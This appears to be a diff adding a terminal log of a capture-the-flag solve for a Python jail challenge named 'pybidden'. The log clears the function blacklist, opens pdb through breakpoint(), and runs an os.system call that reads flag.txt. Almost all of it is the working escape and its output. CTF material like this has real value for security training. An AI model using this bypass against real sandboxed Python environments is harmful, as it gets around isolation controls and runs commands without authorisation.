@@ -1,0 +1,15 @@
+python3 pybidden.py
+Pybidden: python with forbidden function(s)
+>>> breakpoint()
+Exception: not allowed!!
+>>> blacklist.BLACKLIST=[]
+>>> breakpoint()
+--Return--
+> <string>(2)<module>()->None
+(Pdb) __import__('os').system('cat flag.txt')
+COMPFEST16{REDACTED}
+0
+(Pdb) exit
+Exception:
+>>> exit
+>>>
